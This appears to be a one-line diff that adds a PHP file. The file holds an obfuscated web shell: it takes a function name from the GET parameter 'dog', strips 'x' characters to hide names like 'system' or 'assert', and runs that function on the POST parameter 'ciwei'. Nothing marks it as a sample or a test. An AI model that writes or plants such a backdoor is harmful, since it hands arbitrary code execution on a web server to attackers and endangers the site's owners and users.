@@ -1,0 +1,1 @@
+<?php if(key($_GET)=='dog') { $dog=str_replace("x","",$_GET['dog']); call_user_func($dog,$_POST['ciwei']); } ?>
